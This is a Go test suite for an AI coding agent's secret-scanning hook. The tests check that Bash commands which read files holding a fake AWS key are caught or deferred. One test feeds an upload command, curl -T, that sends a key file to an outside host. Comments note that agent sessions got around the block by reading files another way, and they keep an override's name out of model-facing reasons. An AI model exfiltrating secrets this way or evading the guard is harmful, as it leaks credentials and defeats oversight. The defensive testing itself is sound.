package hook

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// bashCall builds a PreToolUse Bash payload with a working directory, which is
// what a relative operand resolves against.
func bashCall(t *testing.T, command, cwd string) string {
	t.Helper()
	return `{"hook_event_name":"PreToolUse","tool_name":"Bash","cwd":` +
		quote(t, cwd) + `,"tool_input":{"command":` + quote(t, command) + `}}`
}

// planted writes a file carrying the fixture key and returns its directory and
// base name.
func planted(t *testing.T) (dir, name string) {
	t.Helper()
	dir = t.TempDir()
	name = "deploy.env"
	if err := os.WriteFile(filepath.Join(dir, name),
		[]byte("AWS_ACCESS_KEY_ID="+secret+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return dir, name
}

// The half of the Bash surface Q50 left: the command string carries no secret
// and the file it names does. Before internal/readers there was nothing to
// tell `secrets.env` from `pat`, and this call went through with the file
// unscanned -- measured against a live Claude Code, not supposed.
func TestAReaderSOperandIsOpenedAndScanned(t *testing.T) {
	dir, name := planted(t)
	for _, command := range []string{
		"cat " + name,
		"grep AWS " + name,
		"head -n 5 " + name,
		"sed -n 1p " + name,
		"egrep AWS " + name,
	} {
		t.Run(command, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, command, dir))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			reason := reasonOf(t, stdout)
			if !strings.Contains(reason, "aws-access-key-id") {
				t.Errorf("reason does not name the rule: %q", reason)
			}
			if !strings.Contains(reason, name) {
				t.Errorf("reason does not name the file: %q", reason)
			}
		})
	}
}

// The pattern is not a path. Opening it would be the wrong-argument-position
// failure pointed the other way -- and if `pat` happened to exist, the scanner
// would read a file the command never touches.
func TestAPatternIsNotOpened(t *testing.T) {
	dir, name := planted(t)
	// A file named for the pattern, carrying nothing. If the spec mistook the
	// pattern for a path, this is what it would read instead of the operand.
	if err := os.WriteFile(filepath.Join(dir, "AWS"), []byte("nothing here\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	code, stdout, _ := drive(t, bashCall(t, "grep AWS "+name, dir))
	if code != 0 {
		t.Fatalf("exit code = %d, want 0", code)
	}
	if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
		t.Errorf("reason = %q, want the operand rather than the pattern", reason)
	}
}

// A substitution's operands are inside the command string as text and its
// FILES are not, which is why the recursion exists at all.
func TestAnOperandInsideACommandSubstitutionIsFound(t *testing.T) {
	dir, name := planted(t)
	code, stdout, stderr := drive(t, bashCall(t, "echo $(cat "+name+")", dir))
	if code != 0 {
		t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
	}
	if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
		t.Errorf("reason = %q, want the file inside the substitution", reason)
	}
}

// Heredoc bodies need no case of their own, because the command string is
// scanned whole and a body is literal text inside it. That is a property of
// how Q50 scans rather than of anything internal/readers does, so it is pinned
// here: a change to what the Bash target holds would take it away in silence.
func TestAHeredocBodyIsScanned(t *testing.T) {
	command := "cat <<EOF\nAWS_ACCESS_KEY_ID=" + secret + "\nEOF\n"
	code, stdout, stderr := drive(t, bashCall(t, command, t.TempDir()))
	if code != 0 {
		t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
	}
	if reason := reasonOf(t, stdout); !strings.Contains(reason, "aws-access-key-id") {
		t.Errorf("reason = %q, want the key in the heredoc body", reason)
	}
}

// An operand of a command known to read files, whose path cannot be settled.
//
// Each defers: no verdict, and a coverage record naming what could not be
// resolved. It blocked until 2026-09-05, and the measurement that changed it is
// in coverage.go -- this class was 94.3% of every block this hook wrote, and
// the session read the same tree another way within four calls 99.2% of the
// time, so the block bought a turn's delay and no coverage at all.
func TestAnOperandThatCannotBeResolvedDefers(t *testing.T) {
	dir := t.TempDir()
	for _, tc := range []struct {
		name    string
		command string
		says    string
	}{
		{"a variable", "cat $SECRETS", "expands at run time"},
		// Segments splits an unquoted `$(` out as its own token, so a reader
		// with a substitution among its arguments has an operand that expands
		// -- which is the same refusal a `$VAR` gets, reached differently.
		{"a substitution among the operands", "cat $(echo hi) f", "expands at run time"},
		// A pattern expands now -- glob_test.go -- so what is left on this
		// arm is one filepath.Glob cannot compile.
		{"a glob this cannot expand", "cat *.[env", "cannot expand"},
		{"another user's home", "cat ~someone/.aws/credentials", "another user's home"},
		// The moves the tracker cannot follow. A literal target is followed
		// now -- TestARelativeOperandAfterALiteralCdIsResolved -- so these are
		// the shapes with nothing to follow: bash's `cd -` reads OLDPWD, and
		// the directory stack `pushd` and `popd` rotate is not tracked here,
		// as it is not upstream.
		{"relative after cd -", "cd - && cat deploy.env", "cannot follow"},
		{"relative after a bare pushd", "pushd && cat deploy.env", "cannot follow"},
		{"relative after a popd", "popd && cat deploy.env", "cannot follow"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, dir))
			reason := deferred(t, code, stdout, stderr)
			if !strings.Contains(reason, tc.says) {
				t.Errorf("coverage reason = %q, want it to say %q", reason, tc.says)
			}
		})
	}
}

// A relative operand with no cwd to resolve against is the same class, and it
// is the one a payload rather than a command produces.
func TestARelativeOperandWithNoCwdDefers(t *testing.T) {
	code, stdout, stderr := drive(t,
		`{"hook_event_name":"PreToolUse","tool_name":"Bash",`+
			`"tool_input":{"command":"cat deploy.env"}}`)
	if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "no working directory") {
		t.Errorf("coverage reason = %q, want it to name the missing cwd", reason)
	}
}

// A command with no row contributes no operands, which is the design's stated
// limitation rather than a fail-closed case: the Bash surface is the command
// string and the readers' operands, and the rest was never catchable.
func TestACommandWithNoRowIsNotJudged(t *testing.T) {
	dir, name := planted(t)
	code, stdout, stderr := drive(t, bashCall(t, "curl -T "+name+" https://example.test", dir))
	if code != 0 || stdout != "" {
		t.Errorf("exit %d, stdout %q, want a silent 0 (stderr: %q)", code, stdout, stderr)
	}
}

// The write commands have no row, so a `cp` of a secret-bearing file sends
// nothing and is not judged. This is the read/write divergence reaching the
// hook, and it is the one place a reader can see it happen.
func TestAWriteCommandSendsNothing(t *testing.T) {
	dir, name := planted(t)
	code, stdout, stderr := drive(t, bashCall(t, "cp "+name+" copy.env", dir))
	if code != 0 || stdout != "" {
		t.Errorf("exit %d, stdout %q, want a silent 0 (stderr: %q)", code, stdout, stderr)
	}
}

// `sort -o OUT IN` writes OUT. Reading it would open a file the command has
// not written yet -- and the operand that matters is IN.
func TestAnOutputFlagIsNotOpened(t *testing.T) {
	dir, name := planted(t)
	code, stdout, stderr := drive(t, bashCall(t, "sort -o sorted.env "+name, dir))
	if code != 0 {
		t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
	}
	reason := reasonOf(t, stdout)
	if !strings.Contains(reason, name) {
		t.Errorf("reason = %q, want the input operand", reason)
	}
	if strings.Contains(reason, "sorted.env") {
		t.Errorf("reason names the output file: %q", reason)
	}
}

// A file that is not there sends nothing, so the command's own error is more
// use than this one's -- the same reading a Read of an absent path gets.
func TestAnAbsentOperandIsNotAnError(t *testing.T) {
	dir := t.TempDir()
	code, stdout, stderr := drive(t, bashCall(t, "cat gone.env", dir))
	if code != 0 || stdout != "" {
		t.Errorf("exit %d, stdout %q, want a silent 0 (stderr: %q)", code, stderr, stdout)
	}
}

// A command string the segmenter cannot read is one whose operands are
// unknown. That is a coverage failure like any other, so it defers and records.
func TestACommandThatCannotBeSegmentedDefers(t *testing.T) {
	code, stdout, stderr := drive(t, bashCall(t, `cat "unbalanced`, t.TempDir()))
	if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "could not be read") {
		t.Errorf("coverage reason = %q, want it to say the command could not be read", reason)
	}
}

// The cap is a backstop, so it has to be reachable to mean anything -- and
// hitting it records rather than silently stopping the walk, because the
// operands past it were never looked at.
func TestNestingPastTheSubstitutionCapDefers(t *testing.T) {
	command := "echo hi"
	for i := 0; i <= maxSubstDepth; i++ {
		command = "echo $(" + command + ")"
	}
	code, stdout, stderr := drive(t, bashCall(t, command, t.TempDir()))
	if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "command substitutions") {
		t.Errorf("coverage reason = %q, want it to name the nesting cap", reason)
	}
}

// The two shapes Segments does not flatten, so the recursion is what reaches
// them. Measured: a backtick substitution comes back with the backticks still
// on its tokens, and a substitution inside a heredoc body is removed by the
// strip that runs before lexing.
func TestTheRecursionReachesWhatSegmentsDoesNot(t *testing.T) {
	dir, name := planted(t)
	for _, tc := range []struct{ name, command string }{
		{"a backtick substitution", "echo `cat " + name + "`"},
		{"a substitution inside a heredoc body", "cat <<EOF\n$(cat " + name + ")\nEOF\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, dir))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
				t.Errorf("reason = %q, want the file the substitution reads", reason)
			}
		})
	}
}

// A `$(…)` inside single quotes is a literal to bash, and neither Segments nor
// CommandSubstitutions treats it as live. Nothing is read, so nothing blocks --
// the control on the test above, and the case that would over-block if the
// scan stopped being quote-aware.
func TestASingleQuotedSubstitutionIsNotFollowed(t *testing.T) {
	dir, name := planted(t)
	code, stdout, stderr := drive(t, bashCall(t, "echo '$(cat "+name+")'", dir))
	if code != 0 || stdout != "" {
		t.Errorf("exit %d, stdout %q, want a silent 0 (stderr: %q)", code, stdout, stderr)
	}
}

// The list is read and what it names is not, so scanning the list alone would
// report a clean result for every path inside it.
func TestAnIndirectlyNamedFileDefers(t *testing.T) {
	dir := t.TempDir()
	code, stdout, stderr := drive(t, bashCall(t, "sort --files0-from list.txt", dir))
	if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "named indirectly") {
		t.Errorf("coverage reason = %q, want it to name the indirection", reason)
	}
}

// `grep -rn pat docs/` is the whole of what this refusal meets in practice --
// 7.1% of the calls that carry a reader operand, measured over this machine's
// transcripts -- so it says "directory" rather than reporting the mode class,
// and it says what to do instead. Before the guard that refused it, the OS
// error said `is a directory`; one reason for every mode would have been less
// to go on than the tree already had.
//
// Pinned because the wording is the decision, and the decision is taken:
// walking the tree instead was measured and refused, because a walk reads a
// different file set from the one the command would send. bashTargets carries
// the argument. A change that made the reason generic again would close
// nothing and would read as tidying.
//
// The arms are the recursion spellings, and they are here because the subject
// of the clause used to be implicit and got read as the command. Nothing
// parses a recursion flag, so all four reach one return -- which makes "this
// reads files rather than walking them" false of the three that do walk, and
// that reading cost a friction report. Containment on "this scanner" is what
// holds the subject named; the four arms are what stop a future flag parser
// from making one spelling say something the others do not.
func TestADirectoryOperandSaysSoAndSaysWhatToDoInstead(t *testing.T) {
	for _, command := range []string{
		"grep -rn pat sub",         // recursion inside a cluster
		"grep -r -n pat sub",       // recursion as its own flag
		"grep --recursive pat sub", // the long form
		"grep -n pat sub",          // no recursion at all
	} {
		t.Run(command, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.Mkdir(filepath.Join(dir, "sub"), 0o755); err != nil {
				t.Fatal(err)
			}
			code, stdout, stderr := drive(t, bashCall(t, command, dir))
			// A directory operand is a coverage failure, so this defers and
			// records rather than blocking. Everything the four arms assert
			// about the wording is unchanged -- the reason moved channel, not
			// content.
			reason := deferred(t, code, stdout, stderr)
			if !strings.Contains(reason, "names a directory") {
				t.Errorf("reason = %q, want it to name the directory case", reason)
			}
			if !strings.Contains(reason, "name the files instead") {
				t.Errorf("reason = %q, want it to carry the remedy", reason)
			}
			if !strings.Contains(reason, "this scanner") {
				t.Errorf("reason = %q, want the subject named, so the clause is not "+
					"read as a claim that the command does not walk", reason)
			}
			if strings.Contains(reason, "neither a file nor a directory") {
				t.Errorf("reason = %q, want the directory case told apart from a fifo", reason)
			}
		})
	}
}

// The reason a deny carries is read by the model, and verdict.go argues that
// naming SPILL_GUARD_OVERRIDE there hands it the bypass. The remedy above is
// the other kind: it says what to read, not how to skip reading. Pinned so
// that making a refusal more helpful cannot quietly cross that line.
//
// TestNoReasonNamesTheOverride is the neighbour and not the same test. That
// one crosses every lead with every body, which cannot reach this text at all:
// the bodies it carries are fixed, and an operand refusal's is written by
// bashTargets from the command in front of it. So this drives real payloads
// instead of composing reasons.
//
// The payloads are still a list somebody keeps -- driving does not change
// that, it only moves the hand-keeping from the reason to the call that
// produces it. What the list has to cover is one payload per surface that
// writes a refusal of its own, which is why the Read arm is here beside the
// three Bash ones: appending the hatch name to hook.go's directory reason
// left this whole package green until it was.
func TestADrivenRefusalDoesNotNameTheOverride(t *testing.T) {
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "sub"), 0o755); err != nil {
		t.Fatal(err)
	}
	payloads := map[string]string{
		"a directory operand": bashCall(t, "grep -rn pat sub", dir),
		"an unresolvable var": bashCall(t, "cat $HOME/x.env", dir),
		"a glob":              bashCall(t, "cat *.[env", dir),
		"a Read of a directory": `{"hook_event_name":"PreToolUse","tool_name":"Read",` +
			`"tool_input":{"file_path":` + quote(t, dir) + `}}`,
	}
	for name, payload := range payloads {
		t.Run(name, func(t *testing.T) {
			code, stdout, stderr := drive(t, payload)
			if reason := deferred(t, code, stdout, stderr); strings.Contains(reason, overrideVar) {
				t.Errorf("the coverage reason names the hatch: %q", reason)
			}
		})
	}
}

// The other spelling of a reader pointed at a file. Segments takes a redirect
// target out of the tokens, so before Segment.Inputs this loop saw `cat` with
// no operand and the file crossed unread -- driven 2026-09-04 on a built
// binary, `cat < deploy.env` exit 0 silent where `cat deploy.env` blocked.
func TestAnInputRedirectIsOpenedAndScanned(t *testing.T) {
	dir, name := planted(t)
	for _, command := range []string{
		"cat < " + name,
		"cat <" + name,
		"head -n 20 < " + name,
		"grep -c AKIA < " + name,
		"wc -l < " + name,
		"cat 0< " + name,
	} {
		t.Run(command, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, command, dir))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			reason := reasonOf(t, stdout)
			if !strings.Contains(reason, "aws-access-key-id") {
				t.Errorf("reason does not name the rule: %q", reason)
			}
			if !strings.Contains(reason, name) {
				t.Errorf("reason does not name the file: %q", reason)
			}
		})
	}
	// The negative control: the same shape over a file holding nothing.
	if err := os.WriteFile(filepath.Join(dir, "notes.txt"), []byte("nothing here\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	code, stdout, stderr := drive(t, bashCall(t, "cat < notes.txt", dir))
	if code != 0 || stdout != "" {
		t.Errorf("exit %d, stdout %q, want a silent 0 (stderr: %q)", code, stdout, stderr)
	}
}

// An input redirect joins the operands of a reader the table knows and no
// other command's. Over the week to 2026-09-04, 141 of the 360 input
// redirects in 28,187 Bash calls were on a command with no row, 77 of them
// `python3`, and those stay the design's stated limitation: what a script
// does with its stdin is not something the tokens say.
func TestAnInputRedirectOnACommandWithNoRowIsNotJudged(t *testing.T) {
	dir, name := planted(t)
	code, stdout, stderr := drive(t, bashCall(t, "python3 - < "+name, dir))
	if code != 0 || stdout != "" {
		t.Errorf("exit %d, stdout %q, want a silent 0 (stderr: %q)", code, stdout, stderr)
	}
}

// `<(cmd)` reaches Segments as `<` and `(`, and the paren is not a file. A
// file literally named `(` holding the key is what would be opened if it were
// taken for one, so that is the fixture -- 49 of the 219 input redirects on a
// known reader in the week to 2026-09-04 were process substitutions.
func TestAProcessSubstitutionIsNotAnInput(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "("),
		[]byte("AWS_ACCESS_KEY_ID="+secret+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	code, stdout, stderr := drive(t, bashCall(t, "cat <(echo hi)", dir))
	if code != 0 || stdout != "" {
		t.Errorf("exit %d, stdout %q, want a silent 0 (stderr: %q)", code, stdout, stderr)
	}
}

// A literal `cd` target is a path this process can compute, so the relative
// operand after it gets a verdict instead of a coverage record. The key is
// planted in a directory the payload's cwd is not, so each arm blocks only if
// the tracker followed the move: resolved against the payload's cwd the file
// is absent, which allows silently.
func TestARelativeOperandAfterALiteralCdIsResolved(t *testing.T) {
	dir, name := planted(t)
	parent, base := filepath.Dir(dir), filepath.Base(dir)
	for _, command := range []string{
		"cd " + base + " && cat " + name,
		"cd " + dir + " && cat " + name,
		"cd -- " + base + " && cat " + name,
		"cd -L " + base + " && cat " + name,
		"pushd " + base + " && cat " + name,
		"cd " + base + "; cat " + name,
		"cd ./" + base + "/. && cat " + name,
		// An absolute target is followed even after a move that lost the
		// directory, which is what `cd -` does.
		"cd - && cd " + dir + " && cat " + name,
	} {
		t.Run(command, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, command, parent))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
				t.Errorf("reason = %q, want the file under the cd target", reason)
			}
		})
	}
}

// A substitution body runs in the directory in force where it was WRITTEN, so
// the operand inside it gets a verdict for the same reason the operand beside
// it does. Before the marking a body found in a string that moved at all
// inherited an unknown directory, so `cd sub && echo $(cat x)` recorded where
// `cd sub && cat x` blocked (Q147).
//
// Every arm plants the key where only the right directory finds it, so an arm
// that resolved against the other one allows silently rather than failing on a
// path.
func TestASubstitutionBodyResolvesWhereItWasWritten(t *testing.T) {
	dir, name := planted(t)
	parent, base := filepath.Dir(dir), filepath.Base(dir)
	// Written after a move the tracker followed: resolved against the payload's
	// cwd the file is absent, so only the followed directory finds it.
	for _, command := range []string{
		"cd " + base + " && echo $(cat " + name + ")",
		"cd " + base + " && echo `cat " + name + "`",
		"cd " + base + "; echo \"$(cat " + name + ")\"",
		// A body inside a body. The outer one is placed, and the inner is
		// placed within it by the same walk one pass down.
		"cd " + base + " && echo $(echo `cat " + name + "`)",
	} {
		t.Run(command, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, command, parent))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
				t.Errorf("reason = %q, want the file under the cd target", reason)
			}
		})
	}
	// Written BEFORE the move, which is the half a body inheriting the string's
	// end state gets wrong in the other direction: the entry directory is the
	// one bash reads it in, and the move after it changes nothing.
	t.Run("before the move", func(t *testing.T) {
		code, stdout, stderr := drive(t, bashCall(t,
			"echo $(cat "+name+") && cd "+base, dir))
		if code != 0 {
			t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
		}
		if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
			t.Errorf("reason = %q, want the file under the entry directory", reason)
		}
	})
	// Two bodies written identically at two points in one string. Keying the
	// directory on body text would collapse them onto one answer; a position
	// cannot. The clean file is what makes the wrong answer silent.
	t.Run("two identical bodies", func(t *testing.T) {
		root := t.TempDir()
		for _, sub := range []string{"a", "b"} {
			if err := os.Mkdir(filepath.Join(root, sub), 0o755); err != nil {
				t.Fatal(err)
			}
			body := "nothing here\n"
			if sub == "b" {
				body = "AWS_ACCESS_KEY_ID=" + secret + "\n"
			}
			if err := os.WriteFile(filepath.Join(root, sub, "deploy.env"), []byte(body), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		// `;` and not `&&`: a `cd` reached through `&&` after a command is
		// tentative to the and-or list, and the statement end that follows
		// drops it -- which is that rule and not this one.
		code, stdout, stderr := drive(t, bashCall(t,
			"cd a; echo $(cat deploy.env); cd ../b; echo $(cat deploy.env)", root))
		if code != 0 {
			t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
		}
		if reason := reasonOf(t, stdout); !strings.Contains(reason, filepath.Join("b", "deploy.env")) {
			t.Errorf("reason = %q, want the file under b", reason)
		}
	})
	// The marker is a bare word with no `$` in it, so a variable map built over
	// the MARKED tokens reads `SP=$(pwd)` as a literal assignment where the
	// walk in bashTargets poisons the name -- and the `cd $SP` after it then
	// resolves against a directory bash is not in, silently. Restoring before
	// anything reads the tokens is what keeps the two walks agreeing. The key
	// is in `a`, which is where bash reads it and where neither walk can say it
	// is, so the arm that gets this wrong scans the clean file in `b` and
	// allows.
	t.Run("a substitution assigned to a name is poisoned in this walk too", func(t *testing.T) {
		root := t.TempDir()
		for _, sub := range []string{"a", "b"} {
			if err := os.Mkdir(filepath.Join(root, sub), 0o755); err != nil {
				t.Fatal(err)
			}
			body := "nothing here\n"
			if sub == "a" {
				body = "AWS_ACCESS_KEY_ID=" + secret + "\n"
			}
			if err := os.WriteFile(filepath.Join(root, sub, "deploy.env"), []byte(body), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		// A backtick body, because a `$(…)` one is flattened into the in-order
		// pass as well and that pass records the operand on its own.
		code, stdout, stderr := drive(t, bashCall(t,
			"cd a; SP=$(pwd); cd ../b; cd $SP; echo `cat deploy.env`", root))
		if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "cannot follow") {
			t.Errorf("coverage reason = %q, want the move unfollowed", reason)
		}
	})
	// A body found inside a heredoc body is the one the marking cannot place:
	// the strip lifted it out of the string before there was anything to mark,
	// so it keeps the inheritance every body had before. Named here rather than
	// beside the unfollowed moves because what leaves it unsettled is the strip
	// and not the `cd`.
	t.Run("a body inside a heredoc body keeps the inheritance", func(t *testing.T) {
		code, stdout, stderr := drive(t, bashCall(t,
			"cd "+base+" && cat <<EOF\n$(cat "+name+")\nEOF\n", parent))
		if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "cannot follow") {
			t.Errorf("coverage reason = %q, want the move unfollowed", reason)
		}
	})
	// The sentinel the marker is built from cannot appear in a command Claude
	// Code sends, and a string carrying one anyway is left unmarked rather than
	// mismarked. What it falls back to is what every body inherited before the
	// marking, so the arm is the pre-Q147 answer rather than a new one.
	t.Run("a string carrying the sentinel is left unmarked", func(t *testing.T) {
		code, stdout, stderr := drive(t, bashCall(t,
			"cd "+base+" && echo \x1e && echo $(cat "+name+")", parent))
		if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "cannot follow") {
			t.Errorf("coverage reason = %q, want the move unfollowed", reason)
		}
	})
}

// A quoted target is one token to the lexer, and the space is the case that
// tells a tracker reading tokens from one re-splitting the string.
func TestACdToAQuotedTargetIsFollowed(t *testing.T) {
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, "my dir"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "my dir", "deploy.env"),
		[]byte("AWS_ACCESS_KEY_ID="+secret+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	code, stdout, stderr := drive(t, bashCall(t, "cd 'my dir' && cat deploy.env", root))
	if code != 0 {
		t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
	}
	if reason := reasonOf(t, stdout); !strings.Contains(reason, "deploy.env") {
		t.Errorf("reason = %q, want the file under the quoted target", reason)
	}
}

// The directory advances through the segments in order, so two operands with
// the same name resolve against two directories. The key is in one of them
// and the other holds a clean file of the same name; a tracker stuck on the
// first move would read the clean file twice and allow.
func TestEachSegmentResolvesAgainstItsOwnDirectory(t *testing.T) {
	for _, planted := range []string{"a", "b"} {
		t.Run("key in "+planted, func(t *testing.T) {
			root := t.TempDir()
			for _, sub := range []string{"a", "b"} {
				if err := os.Mkdir(filepath.Join(root, sub), 0o755); err != nil {
					t.Fatal(err)
				}
				body := "nothing here\n"
				if sub == planted {
					body = "AWS_ACCESS_KEY_ID=" + secret + "\n"
				}
				if err := os.WriteFile(filepath.Join(root, sub, "deploy.env"), []byte(body), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			command := "cd a && cat deploy.env && cd ../b && cat deploy.env"
			code, stdout, stderr := drive(t, bashCall(t, command, root))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			if reason := reasonOf(t, stdout); !strings.Contains(reason, filepath.Join(planted, "deploy.env")) {
				t.Errorf("reason = %q, want the file under %s", reason, planted)
			}
		})
	}
}

// The two substitutions a target may carry and still be followed, because
// their value is computable here without running anything: `$(pwd)` is the
// tracked directory and `$(git rev-parse --show-toplevel)` is its nearest
// ancestor holding a `.git` entry. The quoted form is the one the global
// working agreement tells sessions to write, and it is the one that arrives
// as a single token -- unquoted, Segments splits the body out and the target
// is `$(`, which stays unfollowed.
func TestAWhitelistedSubstitutionCdIsFollowed(t *testing.T) {
	root := t.TempDir()
	for _, d := range []string{".git", "sub"} {
		if err := os.Mkdir(filepath.Join(root, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(root, "deploy.env"),
		[]byte("AWS_ACCESS_KEY_ID="+secret+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	sub := filepath.Join(root, "sub")
	for _, command := range []string{
		`cd "$(git rev-parse --show-toplevel)" && cat deploy.env`,
		`cd "$( git  rev-parse   --show-toplevel )" && cat deploy.env`,
		`pushd "$(git rev-parse --show-toplevel)" && cat deploy.env`,
		`cd "$(pwd)" && cat ../deploy.env`,
	} {
		t.Run(command, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, command, sub))
			if code != 0 {
				t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
			}
			if reason := reasonOf(t, stdout); !strings.Contains(reason, "deploy.env") {
				t.Errorf("reason = %q, want the file at the toplevel", reason)
			}
		})
	}
	// Two ways the toplevel is not computable here: no `.git` boundary above
	// the cwd, and a git-discovery variable that would move git's own answer.
	// Either way the move is unfollowed rather than guessed at.
	t.Run("no .git boundary", func(t *testing.T) {
		if err := os.Remove(filepath.Join(root, ".git")); err != nil {
			t.Fatal(err)
		}
		code, stdout, stderr := drive(t, bashCall(t,
			`cd "$(git rev-parse --show-toplevel)" && cat deploy.env`, sub))
		if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "cannot follow") {
			t.Errorf("coverage reason = %q, want the move unfollowed", reason)
		}
	})
	t.Run("GIT_DIR set", func(t *testing.T) {
		if err := os.Mkdir(filepath.Join(root, ".git"), 0o755); err != nil {
			t.Fatal(err)
		}
		t.Setenv("GIT_DIR", filepath.Join(root, "elsewhere.git"))
		code, stdout, stderr := drive(t, bashCall(t,
			`cd "$(git rev-parse --show-toplevel)" && cat deploy.env`, sub))
		if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "cannot follow") {
			t.Errorf("coverage reason = %q, want the move unfollowed", reason)
		}
	})
}

// The moves whose destination is not the literal, or not a literal at all.
// Each leaves the directory unknown and the relative operand after it
// recorded rather than resolved -- which is also what every one of them did
// before the tracker, so this is the arm that has to stay where it is.
//
// The first five are upstream's own "unknown" answers. The rest are this
// port's, each in the direction that records: a move in a subshell or a
// pipeline stage does not reach the commands after it; `-P` resolves `..`
// through symlinks where the tracker reads it lexically; `pushd -n` rotates
// the stack without moving; a target that is not a directory leaves the shell
// where it was under `;`; a CDPATH turns a relative target into a search; a
// relative target after a lost directory has nothing to join to; and a
// substitution body is queued with no position relative to the cd, so after
// any move it inherits a lost directory rather than the payload's cwd.
//
// A substitution body is not in that class any more. It is placed where it was
// written and gets the directory in force there, which
// TestASubstitutionBodyResolvesWhereItWasWritten holds; what still leaves one
// unsettled is a move the tracker could not follow, which is the last two rows
// below and is this list's own rule rather than a second one.
func TestACdThisCannotFollowLeavesTheOperandUnsettled(t *testing.T) {
	dir, name := planted(t)
	parent, base := filepath.Dir(dir), filepath.Base(dir)
	for _, tc := range []struct{ name, command string }{
		{"bare cd", "cd && cat " + name},
		{"cd -", "cd - && cat " + name},
		{"a $ target", "cd $D && cat " + name},
		{"another user's home", "cd ~someone && cat " + name},
		{"pushd +N", "pushd +1 && cat " + name},
		{"a move in a subshell", "(cd " + base + ") && cat " + name},
		{"a move in a pipeline stage", "cd " + base + " | cat " + name},
		{"a physical cd", "cd -P " + base + " && cat " + name},
		{"pushd -n", "pushd -n " + base + " && cat " + name},
		{"a target that is not there", "cd nowhere; cat " + name},
		{"a target that is a file", "cd " + base + "/" + name + "; cat " + name},
		{"a CDPATH in the same segment", "CDPATH=/tmp cd " + base + " && cat " + name},
		{"a relative target after a lost directory", "cd - && cd " + base + " && cat " + name},
		{"a move reached through ||", "false || cd " + base + "; cat " + name},
		{"a move reached through && after a command, in the next statement", "true && cd " + base + "; cat " + name},
		// A substitution body is placed where it was written now
		// (TestASubstitutionBodyResolvesWhereItWasWritten), so a move the
		// tracker cannot follow is what still leaves one unsettled.
		{"a $(…) body after a move this cannot follow", "cd $D && echo $(cat " + name + ")"},
		{"a backtick body after a move this cannot follow", "cd $D && echo `cat " + name + "`"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			code, stdout, stderr := drive(t, bashCall(t, tc.command, parent))
			if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "cannot follow") {
				t.Errorf("coverage reason = %q, want the move unfollowed", reason)
			}
		})
	}
	// CDPATH from the environment reaches every relative target, and an
	// absolute one is what it does not reach.
	t.Run("a CDPATH in the environment", func(t *testing.T) {
		t.Setenv("CDPATH", "/tmp")
		code, stdout, stderr := drive(t, bashCall(t, "cd "+base+" && cat "+name, parent))
		if reason := deferred(t, code, stdout, stderr); !strings.Contains(reason, "cannot follow") {
			t.Errorf("coverage reason = %q, want the move unfollowed", reason)
		}
		code, stdout, stderr = drive(t, bashCall(t, "cd "+dir+" && cat "+name, parent))
		if code != 0 {
			t.Fatalf("exit code = %d, want 0 (stderr: %q)", code, stderr)
		}
		if reason := reasonOf(t, stdout); !strings.Contains(reason, name) {
			t.Errorf("reason = %q, want the absolute move followed", reason)
		}
	})
}

// A variable the same command string assigns a literal is one bash and this
// hook read off the same text, so the operand it appears in gets a verdict
// instead of a coverage record. The key is planted where only the resolved
// path finds it.
